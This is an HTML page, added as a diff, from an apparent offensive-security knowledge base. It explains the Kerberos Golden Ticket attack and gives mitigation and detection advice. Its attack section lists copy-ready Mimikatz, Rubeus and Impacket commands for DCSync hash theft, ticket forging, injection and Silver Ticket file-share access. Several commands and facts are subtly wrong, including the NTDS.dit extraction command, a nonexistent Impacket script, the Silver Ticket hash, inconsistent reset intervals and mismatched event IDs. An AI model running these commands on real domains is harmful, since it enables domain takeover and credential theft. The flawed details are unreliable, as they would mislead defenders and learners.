@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Golden Ticket Attack | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .warning-box { background: rgba(255,136,0,0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .warning-box strong { color: #ff8800; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../active-directory/index.html">AD Security</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="../active-directory/index.html">Active Directory</a> / Golden Ticket
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | ATT&CK T1558.001</span>
+      <h1>👑 Golden Ticket Attack</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE ATT&CK</strong><span>T1558.001</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Expert</span></div>
+        <div class="meta-item"><strong>Privilege</strong><span>Domain Admin</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>A Golden Ticket attack involves forging a Kerberos Ticket Granting Ticket (TGT) using the KRBTGT account's NTLM password hash. This gives the attacker persistent, domain-wide authentication that can last up to the maximum ticket lifetime (typically 10 hours by default, but forgeable for years).</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why Golden Ticket is Critical:</strong>
+        <ul>
+          <li><strong>Persistence:</strong> Access lasts until KRBTGT password is rotated twice</li>
+          <li><strong>Evasion:</strong> Completely bypasses normal authentication</li>
+          <li><strong>Domain Dominance:</strong> Authenticate as any user to any service</li>
+          <li><strong>Privilege Escalation:</strong> Forge tickets for Domain Admin or any account</li>
+          <li><strong>Detection Evasion:</strong> Doesn't trigger normal login alerts</li>
+        </ul>
+      </div>
+
+      <p><strong>Kerberos Authentication Overview:</strong></p>
+      <ol>
+        <li>User requests TGT from AS (Authentication Service)</li>
+        <li>AS returns TGT encrypted with KRBTGT hash</li>
+        <li>User presents TGT to TGS (Ticket Granting Service)</li>
+        <li>TGS returns service ticket for requested resource</li>
+        <li>User presents service ticket to resource</li>
+      </ol>
+
+      <p>In a Golden Ticket attack, the attacker bypasses steps 1-3 by forging their own TGT using the KRBTGT hash.</p>
+    </div>
+
+    <!-- 2. PRECONDITIONS -->
+    <div class="content-section" id="preconditions">
+      <h2>⚠️ Preconditions</h2>
+      <ul>
+        <li><strong>KRBTGT Hash:</strong> Must obtain the NTLM or AES hash of the KRBTGT account</li>
+        <li><strong>Domain Name:</strong> FQDN of the target domain</li>
+        <li><strong>User SID:</strong> SID of any account (typically Domain Admin)</li>
+        <li><strong>Domain SID:</strong> SID of the domain (not user portion)</li>
+      </ul>
+
+      <div class="warning-box">
+        <strong>How to Get KRBTGT Hash:</strong>
+        <ul>
+          <li>Domain Admin access → DCSync attack</li>
+          <li>NTDS.dit extraction</li>
+          <li>LSASS memory dump on Domain Controller</li>
+          <li>Any method that yields the KRBTGT password hash</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 3. ATTACK -->
+    <div class="content-section" id="attack">
+      <h2>💣 Attack Execution</h2>
+      
+      <p><strong>Using Mimikatz:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Option 1: DCSync to get KRBTGT hash
+mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt
+
+# Option 2: Extract from NTDS.dit
+mimikatz # lsadump::sam /sam:SAM_dump /system:SYSTEM_dump
+
+# Create Golden Ticket
+mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:krbtgt_hash_here /id:500 /groups:513,512,520,518,519
+
+# Inject ticket into current session
+mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-xxx /krbtgt:hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
+
+# Verify with directory access
+mimikatz # lsadump::dcsync /domain:target.local /user:Administrator /all</pre>
+      </div>
+
+      <p><strong>Using Rubeus:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create Golden Ticket
+Rubeus.exe goldenticket /domain:target.local /user:Administrator /sid:S-1-5-21-xxx /krbtgt:krbtgt_hash /ptt
+
+# With custom expiration (default 10 years)
+Rubeus.exe goldenticket /domain:target.local /user:Administrator /sid:S-1-5-21-xxx /krbtgt:hash /endin:87600 /ptt
+
+# After creation, verify access
+Rubeus.exe asktgt /user:Administrator /domain:target.local /rc4:krbtgt_hash</pre>
+      </div>
+
+      <p><strong>Using Impacket:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Python script for Golden Ticket
+python3 goldenTicket.py -domain target.local -domain-sid S-1-5-21-xxx -krbtgt-hash hash -user-id 500
+
+# Load ticket with ticket converter
+python3 ticketer.py -domain target.local -domain-sid S-1-5-21-xxx -krbtgt-hash hash -user Administrator
+
+# Export tokirbi file and load
+export KRB5CCNAME=admin.ccache
+python3 getST.py -self -impersonate Administrator -dc-ip 192.168.1.1 target.local/krbtgt</pre>
+      </div>
+    </div>
+
+    <!-- 4. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact Analysis</h2>
+      
+      <div class="vulnerability-box">
+        <strong>Capabilities Gained:</strong>
+        <ul>
+          <li><strong>Impersonate Any User:</strong> Become any user including Domain Admins</li>
+          <li><strong>Access Any Resource:</strong> Any file share, database, or service</li>
+          <li><strong>DCSync:</strong> Replicate domain database for all credentials</li>
+          <li><strong>Persistence:</strong> Access remains until password reset</li>
+          <li><strong>Trust Exploitation:</strong> Forge tickets for forest trusts</li>
+        </ul>
+      </div>
+
+      <p><strong>Attack Chain:</strong></p>
+      <ol>
+        <li>Gain Domain Admin access through other means</li>
+        <li>Extract KRBTGT hash via DCSync</li>
+        <li>Create Golden Ticket for persistence</li>
+        <li>Wait for detection of initial compromise</li>
+        <li>Attacker gets removed from Domain Admins</li>
+        <li>Golden Ticket still works - full access restored</li>
+      </ol>
+    </div>
+
+    <!-- 5. SILVER TICKET -->
+    <div class="content-section" id="silver-ticket">
+      <h2>🥈 Silver Ticket vs Golden Ticket</h2>
+      
+      <table>
+        <thead>
+          <tr><th>Aspect</th><th>Golden Ticket</th><th>Silver Ticket</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Ticket Type</td><td>TGT (Ticket Granting Ticket)</td><td>TGS (Service Ticket)</td></tr>
+          <tr><td>Encrypted With</td><td>KRBTGT hash</td><td>Service account hash</td></tr>
+          <tr><td>Scope</td><td>Entire domain</td><td>Single service</td></tr>
+          <tr><td>Privilege</td><td>Any user, any service</td><td>Specific service account</td></tr>
+          <tr><td>Detection</td><td>Harder to detect</td><td>Easier to detect</td></tr>
+          <tr><td>Duration</td><td>Up to 10 years</td><td>Service account's max</td></tr>
+        </tbody>
+      </table>
+
+      <p><strong>Silver Ticket Example:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create Silver Ticket for CIFS (file share)
+mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-xxx /target:cifs.server.target.local /service:cifs /krbtgt:hash /ptt
+
+# Access file share
+dir \\server.target.local\c$</pre>
+      </div>
+    </div>
+
+    <!-- 6. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Golden Ticket Defense:</strong>
+        <ul>
+          <li><strong>KRBTGT Password Reset:</strong> Reset twice (48 hours apart)</li>
+          <li><strong>Privileged Account Monitoring:</strong> Alert on KRBTGT access</li>
+          <li><strong>Event Log Monitoring:</strong> Alert on unusual TGT activity</li>
+          <li><strong>Protected Users Group:</strong> Don't allow protected users to use RC4</li>
+          <li><strong>AES Encryption Only:</strong> Force AES for all Kerberos tickets</li>
+        </ul>
+      </div>
+
+      <p><strong>KRBTGT Reset Script:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Reset KRBTGT password (run twice, 24 hours apart)
+# This breaks ALL existing TGTs including any Golden Tickets
+Reset-ADAccountPassword -Identity krbtgt -DomainController dc01.target.local
+
+# Or using safer reset method (requires Jan 2023 updates)
+Invoke-ADLabResetKrbtgtPassword -Identity krbtgt -DistinguishedName "CN=krbtgt,CN=Users,DC=target,DC=local"
+
+# Verify reset was successful
+Get-ADUser krbtgt -Properties msds-keyversionnumber</pre>
+      </div>
+
+      <p><strong>Monitoring Event ID 4768:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Alert on suspicious TGT requests
+# Golden Tickets often have unusual properties:
+# - Future start time (StartTime)
+# - Unusually long lifetime
+# - Non-standard encryption type
+# - Unusual account names
+
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4768} |
+  Where-Object {
+    $_.TimeGenerated -gt (Get-Date).AddDays(-1) -and
+    ($_.Properties[4].Value -match "future_date" -or
+     $_.Properties[8].Value -gt 86400)  # > 24 hours
+  }</pre>
+      </div>
+    </div>
+
+    <!-- 7. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+
+      <p><strong>Event ID 4768 (TGT Request) Analysis:</strong></p>
+      <ul>
+        <li>Request from unusual source IP</li>
+        <li>Ticket lifetime > 10 hours</li>
+        <li>Start time in the past (retroactive ticket)</li>
+        <li>Account never authenticates normally</li>
+        <li>Unusual service type (rc4 vs aes)</li>
+      </ul>
+
+      <p><strong>Sigma Rule:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>title: Suspicious Golden Ticket Usage
+id: golden-ticket-detection
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 4769
+    TicketEncryptionType: 0x17  # RC4-HMAC
+  timeframe:
+    # Check for multiple requests with same ticket
+  condition: selection
+fields:
+  - TargetUserName
+  - ServiceName
+  - IpAddress
+level: critical</pre>
+      </div>
+    </div>
+
+    <!-- 8. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1558/001/" target="_blank">MITRE ATT&CK T1558.001</a></li>
+        <li><a href="https://www.harmj0y.net/blog/activedirectory/kerberos-and-golden-tickets/" target="_blank">Harmj0y - Kerberos Golden Tickets</a></li>
+        <li><a href="https://github.com/mandatoryprogrammer/ADSecurity/blob/master/Invoke-ADLabResetKrbtgtPassword.ps1" target="_blank">KRBTGT Reset Script</a></li>
+        <li><a href="https://adsecurity.org/?p=1515" target="_blank">AD Security - Detecting Golden Ticket</a></li>
+      </ul>
+    </div>
+
+    <a href="../active-directory/index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Active Directory</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
